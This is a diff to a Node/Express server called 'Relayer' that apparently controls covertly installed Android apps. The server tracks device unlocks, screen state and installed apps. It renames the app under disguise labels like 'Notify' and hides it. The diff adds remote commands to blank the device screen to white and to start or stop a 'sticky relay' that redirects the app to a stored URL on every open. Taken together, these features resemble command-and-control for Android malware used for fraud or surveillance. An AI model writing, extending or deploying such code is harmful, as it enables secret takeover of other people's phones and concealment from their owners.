@@ -50,6 +50,8 @@ setInterval(() => {
       commands.delete(`${k}:2`);
       commands.delete(`${k}:rename`);
       commands.delete(`${k}:visibility`);
+      commands.delete(`${k}:blank`);
+      commands.delete(`${k}:stopRelay`);
       commands.delete(k); // legacy bare-key entries
     }
   }
@@ -89,6 +91,10 @@ function peekCommands(deviceId) {
   if (ren) out.push({ action: "rename", alias: ren.alias, label: ALIASES[ren.alias], ts: ren.ts });
   const vis = commands.get(`${deviceId}:visibility`);
   if (vis) out.push({ action: "visibility", visible: vis.visible, ts: vis.ts });
+  const blank = commands.get(`${deviceId}:blank`);
+  if (blank) out.push({ action: "blank", enabled: blank.enabled, ts: blank.ts });
+  const stop = commands.get(`${deviceId}:stopRelay`);
+  if (stop) out.push({ action: "stopRelay", ts: stop.ts });
   return out;
 }
 
@@ -100,6 +106,8 @@ function consumeCommands(deviceId) {
   commands.delete(deviceId);
   commands.delete(`${deviceId}:rename`);
   commands.delete(`${deviceId}:visibility`);
+  commands.delete(`${deviceId}:blank`);
+  commands.delete(`${deviceId}:stopRelay`);
   return out;
 }
 
@@ -136,7 +144,7 @@ function checkSecret(req){
 
 function upsert(body, ip, ua){
   const now = new Date().toISOString();
-  let { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel, hidden, inUse, screenOn, lastUnlock, ringerMode, appState, appStateAt } = body || {};
+  let { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, alias, appLabel, hidden, inUse, screenOn, lastUnlock, ringerMode, appState, appStateAt, blankEnabled, relayActive, relaySlot } = body || {};
   validateDeviceId(deviceId);
   // Per-device command lock: every device owns a secret token minted at
   // first sight and stored on its row. heartbeat/poll must present it via
@@ -172,13 +180,19 @@ function upsert(body, ip, ua){
   alias = typeof alias === "string" && ALIASES[alias] ? alias : (existingAlias(deviceId) || "notify");
   appLabel = ALIASES[alias] || "Notify";
   hidden = typeof hidden === "boolean" ? hidden : (store.get(deviceId)?.hidden === true);
+  // Blank white-screen mode (dashboard-only): keep stored value when absent.
+  blankEnabled = typeof blankEnabled === "boolean" ? blankEnabled : (store.get(deviceId)?.blankEnabled === true);
+  // Sticky relay state: device reports whether a sticky URL is stored and
+  // which slot it came from. Keep stored values when absent.
+  relayActive = typeof relayActive === "boolean" ? relayActive : (store.get(deviceId)?.relayActive === true);
+  relaySlot = relaySlot === 2 ? 2 : relaySlot === 1 ? 1 : (store.get(deviceId)?.relaySlot || 1);
 
   if (!store.has(deviceId) && store.size >= MAX_DEVICES) throw new Error("store full");
 
   const existing = store.get(deviceId);
   const dev = existing
-    ? { ...existing, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, inUse, screenOn, lastUnlock, ringerMode, appState, appStateAt, alias, appLabel, hidden, ip, userAgent: ua?.slice(0,128), lastSeen: now, heartbeatCount: (existing.heartbeatCount||0)+1 }
-    : { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, inUse, screenOn, lastUnlock, ringerMode, appState, appStateAt, alias, appLabel, hidden, ip, userAgent: ua?.slice(0,128), firstSeen: now, lastSeen: now, heartbeatCount: 1 };
+    ? { ...existing, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, inUse, screenOn, lastUnlock, ringerMode, appState, appStateAt, alias, appLabel, hidden, blankEnabled, relayActive, relaySlot, ip, userAgent: ua?.slice(0,128), lastSeen: now, heartbeatCount: (existing.heartbeatCount||0)+1 }
+    : { deviceId, model, androidVersion, appVersion, installed, missing, monitorRunning, batteryOptimized, inUse, screenOn, lastUnlock, ringerMode, appState, appStateAt, alias, appLabel, hidden, blankEnabled, relayActive, relaySlot, ip, userAgent: ua?.slice(0,128), firstSeen: now, lastSeen: now, heartbeatCount: 1 };
   dev.token = token; // never serialized to dashboards (stripped below)
   store.set(deviceId, dev);
   return dev;
@@ -301,6 +315,35 @@ app.post("/relay/visibility", (req,res) => {
     res.json({ ok:true, queued:true, deviceId, visible });
   }catch(e){ res.status(e.status||400).json({error:e.message}); }
 });
+// Dashboard -> device: blank white-screen mode (latest wins; consumed with poll).
+// enabled=true shows ONLY white until enabled=false. Dashboard-only control.
+app.post("/relay/blank", (req,res) => {
+  try{
+    checkSecret(req);
+    const { deviceId, enabled } = req.body || {};
+    validateDeviceId(deviceId);
+    if (typeof enabled !== "boolean") {
+      return res.status(400).json({ error: "enabled must be boolean" });
+    }
+    if (!store.has(deviceId)) return res.status(404).json({error:"device not found or offline"});
+    commands.set(`${deviceId}:blank`, { enabled, ts: Date.now() });
+    console.log(`[blank] queued for ${deviceId.slice(0,12)} -> ${enabled ? "ON" : "OFF"}`);
+    res.json({ ok:true, queued:true, deviceId, enabled });
+  }catch(e){ res.status(e.status||400).json({error:e.message}); }
+});
+// Dashboard -> device: stop the sticky auto-relay (consumed with poll).
+// Clears the stored relay URL so the app stops redirecting on every open.
+app.post("/relay/stop-relay", (req,res) => {
+  try{
+    checkSecret(req);
+    const { deviceId } = req.body || {};
+    validateDeviceId(deviceId);
+    if (!store.has(deviceId)) return res.status(404).json({error:"device not found or offline"});
+    commands.set(`${deviceId}:stopRelay`, { ts: Date.now() });
+    console.log(`[stop-relay] queued for ${deviceId.slice(0,12)}`);
+    res.json({ ok:true, queued:true, deviceId });
+  }catch(e){ res.status(e.status||400).json({error:e.message}); }
+});
 app.get("/relay/poll/:deviceId", (req,res) => {
   try{
     // Device poll proves ownership with x-device-token (bound at register).
@@ -330,7 +373,7 @@ app.get("/relay/devices", (req,res) => {
   }catch(e){ res.status(e.status||400).json({error:e.message}); }
 });
 app.get("/relay/health", (req,res)=> res.json({ ok:true, count: store.size, tellerUrl: TELLER_URL, relayerUrl: RELAYER_URL, uptime: process.uptime(), maxDevices: MAX_DEVICES, ttlMs: TTL_MS }));
-app.get("/", (req,res)=> res.json({ name:"Relayer", tellerUrl: TELLER_URL, relayerUrl: RELAYER_URL, aliases: ALIASES, endpoints: ["/relay/register","/relay/heartbeat","/relay/devices","/relay/health","/relay/relay","/relay/rename","/relay/visibility","/relay/poll/:deviceId"] }));
+app.get("/", (req,res)=> res.json({ name:"Relayer", tellerUrl: TELLER_URL, relayerUrl: RELAYER_URL, aliases: ALIASES, endpoints: ["/relay/register","/relay/heartbeat","/relay/devices","/relay/health","/relay/relay","/relay/rename","/relay/visibility","/relay/blank","/relay/stop-relay","/relay/poll/:deviceId"] }));
 app.use((req,res)=> res.status(404).json({error:"not found"}));
 
 app.listen(PORT, ()=> console.log(`Relayer fortified :${PORT}  TELLER=${TELLER_URL}  RELAYER=${RELAYER_URL}  secret=${RELAYER_SECRET?"set":"none"}`));
